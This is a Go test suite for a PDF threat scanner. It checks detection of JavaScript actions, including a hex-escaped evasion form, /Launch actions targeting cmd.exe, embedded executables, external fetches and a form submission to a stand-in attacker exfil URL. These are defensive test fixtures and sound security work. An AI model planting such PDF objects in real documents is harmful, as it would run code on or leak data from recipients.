package pdfsec

import (
	"bytes"
	"strings"
	"testing"
)

// pdfHeader is the minimal magic preamble Inspect requires before it'll
// even look at the body. Real PDFs follow this with a binary comment
// line; we keep that out so test fixtures stay readable.
const pdfHeader = "%PDF-1.4\n"

// pdfBody wraps content in a minimal trailer + xref so the body looks
// PDF-shaped enough that future, stricter parsers don't false-negative
// the test inputs. The current Inspect doesn't validate xref structure,
// so this is forward-compatibility insurance only.
func pdfBody(inner string) []byte {
	return []byte(pdfHeader + inner + "\nxref\n0 1\n0000000000 65535 f \ntrailer\n<< /Size 1 >>\nstartxref\n0\n%%EOF\n")
}

// TestInspectCleanPDF confirms a benign PDF — no actions, no embedded
// files, no external refs — produces an empty Threats() list. If this
// regresses the gate would block legitimate uploads.
func TestInspectCleanPDF(t *testing.T) {
	clean := pdfBody(`
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Hello world) Tj ET
endstream
endobj
`)
	rep, err := Inspect(bytes.NewReader(clean))
	if err != nil {
		t.Fatalf("Inspect: %v", err)
	}
	if !rep.IsPDF {
		t.Fatal("IsPDF=false on a valid PDF")
	}
	if got := rep.Threats(); len(got) != 0 {
		t.Errorf("clean PDF reported threats: %v", got)
	}
}

// TestInspectNotAPDF locks the magic-bytes guard. A caller that hands
// us non-PDF bytes (HTML, ZIP, image) gets ErrNotPDF — never a
// false-positive threat report.
func TestInspectNotAPDF(t *testing.T) {
	for _, in := range [][]byte{
		[]byte("<html><body>hi</body></html>"),
		{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'},
		{},
		[]byte("PK\x03\x04 zip not pdf"),
	} {
		_, err := Inspect(bytes.NewReader(in))
		if err != ErrNotPDF {
			t.Errorf("Inspect(%q): want ErrNotPDF, got %v", in, err)
		}
	}
}

// TestInspectJavaScript covers the audit's first marquee threat:
// embedded /JavaScript and the shorthand /JS that Acrobat treats as an
// alias. Includes the obfuscated form `/J#61vaScript` to confirm the
// hex-escape decoder kicks in (this is a real-world bypass attempt).
func TestInspectJavaScript(t *testing.T) {
	cases := map[string]string{
		"plain /JavaScript": `
1 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert("xss")) >>
endobj`,
		"shorthand /JS": `
1 0 obj
<< /S /JavaScript /JS 99 0 R >>
endobj`,
		"hex-escaped name": `
1 0 obj
<< /S /J#61vaScript /JS (app.alert(1)) >>
endobj`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			rep, err := Inspect(bytes.NewReader(pdfBody(body)))
			if err != nil {
				t.Fatalf("Inspect: %v", err)
			}
			if !rep.HasJavaScript {
				t.Fatalf("HasJavaScript=false (Threats=%v, Findings=%v)", rep.Threats(), rep.Findings)
			}
		})
	}
}

// TestInspectLaunchAction targets the second audit threat. /Launch is
// the action subtype used by classic "double-click to open malware"
// PDFs (CVE-2010-1240 family). Should fire whether the value is a
// reference, a literal filename, or a nested dict.
func TestInspectLaunchAction(t *testing.T) {
	body := `
1 0 obj
<< /Type /Action /S /Launch /F (cmd.exe) >>
endobj`
	rep, err := Inspect(bytes.NewReader(pdfBody(body)))
	if err != nil {
		t.Fatal(err)
	}
	if !rep.HasLaunchAction {
		t.Fatalf("HasLaunchAction=false: %v", rep.Findings)
	}
}

// TestInspectEmbeddedFile covers the EmbeddedFile/EmbeddedFiles
// dictionary keys that signal a file attachment. Either form should
// trip the detector — both appear in real-world malicious PDFs.
func TestInspectEmbeddedFile(t *testing.T) {
	cases := map[string]string{
		"singular": `
1 0 obj
<< /Type /Filespec /F (payload.exe) /EF << /F 2 0 R >> >>
endobj
2 0 obj
<< /Type /EmbeddedFile /Length 0 >>
stream
endstream
endobj`,
		"plural names tree": `
1 0 obj
<< /Type /Catalog /Names << /EmbeddedFiles 2 0 R >> >>
endobj`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			rep, err := Inspect(bytes.NewReader(pdfBody(body)))
			if err != nil {
				t.Fatal(err)
			}
			if !rep.HasEmbeddedFile {
				t.Fatalf("HasEmbeddedFile=false: %v", rep.Findings)
			}
		})
	}
}

// TestInspectExternalXObject covers the third audit threat — a
// /Filespec or bare /F entry that points at an external URL. Those
// tell the renderer to fetch resources from an attacker-controlled
// host on open, which is both a privacy leak (request fingerprinting)
// and a ramp into more serious renderer vulnerabilities.
func TestInspectExternalXObject(t *testing.T) {
	cases := map[string]string{
		"filespec with http": `
1 0 obj
<< /Type /Filespec /F (https://evil.example/payload) >>
endobj`,
		"bare /F with http": `
1 0 obj
<< /Subtype /Image /F (http://evil.example/track.png) >>
endobj`,
		"ftp scheme": `
1 0 obj
<< /Type /Filespec /F (ftp://evil/x) >>
endobj`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			rep, err := Inspect(bytes.NewReader(pdfBody(body)))
			if err != nil {
				t.Fatal(err)
			}
			if !rep.HasExternalXObject {
				t.Fatalf("HasExternalXObject=false: %v", rep.Findings)
			}
		})
	}
}

// TestInspectSecondaryThreats covers the detections that aren't
// blocked by default but are reported. If these regress, the audit
// trail / report-only mode loses visibility.
func TestInspectSecondaryThreats(t *testing.T) {
	body := `
1 0 obj
<< /Type /Catalog /OpenAction 2 0 R /AA << /WC 3 0 R >> >>
endobj
2 0 obj
<< /S /URI /URI (https://attacker.example) >>
endobj
3 0 obj
<< /S /SubmitForm /F (https://attacker.example/exfil) >>
endobj
4 0 obj
<< /Subtype /RichMedia >>
endobj
5 0 obj
<< /XFA [ (config) 6 0 R ] >>
endobj
6 0 obj
<< /Encrypt 7 0 R >>
endobj`
	rep, err := Inspect(bytes.NewReader(pdfBody(body)))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []bool{
		rep.HasOpenAction,
		rep.HasAdditionalActions,
		rep.HasURIAction,
		rep.HasSubmitForm,
		rep.HasRichMedia,
		rep.HasXFA,
		rep.IsEncrypted,
	} {
		if !want {
			t.Errorf("expected secondary threats all fire: %+v", rep)
			break
		}
	}
}

// TestInspectStreamContentIgnored is the regression we care most
// about: a benign content stream that happens to contain the literal
// keyword `/JavaScript` as drawing text MUST NOT trip the detector.
// Otherwise every PDF generator that emits a hex-encoded font with
// "JavaScript" as a glyph caption would be quarantined.
func TestInspectStreamContentIgnored(t *testing.T) {
	body := `
1 0 obj
<< /Length 200 >>
stream
BT /F1 12 Tf 50 700 Td
(/JavaScript /JS /Launch /EmbeddedFile this is just rendered text) Tj
ET
endstream
endobj`
	rep, err := Inspect(bytes.NewReader(pdfBody(body)))
	if err != nil {
		t.Fatal(err)
	}
	if rep.HasJavaScript || rep.HasLaunchAction || rep.HasEmbeddedFile {
		t.Fatalf("threat keywords inside a stream tripped detection: %+v", rep.Findings)
	}
}

// TestFirstBlocked locks the precedence rules: the canonical-order
// search means an org listing ["launch","javascript"] still gets the
// same answer as ["javascript","launch"] for a PDF that has both
// (deterministic = same scan_signature regardless of config order).
func TestFirstBlocked(t *testing.T) {
	rep := Report{HasJavaScript: true, HasLaunchAction: true}
	for _, blocked := range [][]string{
		{"javascript", "launch"},
		{"launch", "javascript"},
		{"JS", "Launch"}, // alias normalization
	} {
		got := FirstBlocked(rep, blocked)
		if got != ThreatJavaScript {
			t.Errorf("FirstBlocked(%v) = %q, want %q (canonical order should win)",
				blocked, got, ThreatJavaScript)
		}
	}
	// Empty blocked list = report-only mode = nothing fires.
	if FirstBlocked(rep, nil) != "" {
		t.Error("nil blocked list must return empty signature (report-only)")
	}
	if FirstBlocked(rep, []string{}) != "" {
		t.Error("empty blocked list must return empty signature (report-only)")
	}
	// Threat not in policy's block-list = pass.
	clean := Report{HasURIAction: true}
	if FirstBlocked(clean, []string{"javascript"}) != "" {
		t.Error("URI-only PDF should pass when only JS is blocked")
	}
}

// TestNormalizeFeature locks the alias map so a future contributor
// adding a knob to the super-admin UI doesn't have to remember which
// snake_case spelling we picked.
func TestNormalizeFeature(t *testing.T) {
	cases := map[string]string{
		"JavaScript":     ThreatJavaScript,
		"  javascript ": ThreatJavaScript,
		"JS":             ThreatJavaScript,
		"launch_action":  ThreatLaunch,
		"embedded":       ThreatEmbeddedFile,
		"attachment":     ThreatEmbeddedFile,
		"externalRef":    ThreatExternalXObject,
		"external_xobject": ThreatExternalXObject,
		"openaction":     ThreatOpenAction,
		"submit":         ThreatSubmitForm,
	}
	for in, want := range cases {
		if got := normalizeFeature(in); got != want {
			t.Errorf("normalizeFeature(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestStripStreams confirms the stream-skip logic doesn't accidentally
// eat dictionary syntax that just happens to contain the substring
// "stream" (false positive) or trail off forever on an unterminated
// stream (denial of service via malformed PDF).
func TestStripStreams(t *testing.T) {
	// "endstream" appears as a substring of "endstream" everywhere; the
	// stripper should still recognize it as the terminator.
	in := []byte("/Foo (bar)\nstream\nXXXJSXXXX\nendstream\n/Quux 1\n")
	out := stripStreams(in)
	if bytes.Contains(out, []byte("XXXJS")) {
		t.Errorf("stream body leaked through: %q", out)
	}
	if !bytes.Contains(out, []byte("/Quux")) {
		t.Errorf("post-stream content lost: %q", out)
	}

	// Substring "stream" inside a name token must not falsely open a
	// stream block. Without the boundary check the stripper would eat
	// the rest of the document.
	noFalseHit := []byte("/Bytestream 1 /JavaScript (a)\n")
	out = stripStreams(noFalseHit)
	if !bytes.Contains(out, []byte("/JavaScript")) {
		t.Errorf("substring 'stream' inside a name should not start a stream block: %q", out)
	}

	// Unterminated stream — the rest of the buffer is dropped (truncated
	// PDFs don't get to keep matching threat keywords from a broken
	// body), but the function must not loop forever.
	unterm := []byte("/Foo 1\nstream\nendless...")
	out = stripStreams(unterm)
	if strings.Contains(string(out), "endless") {
		t.Errorf("unterminated stream body leaked: %q", out)
	}
}
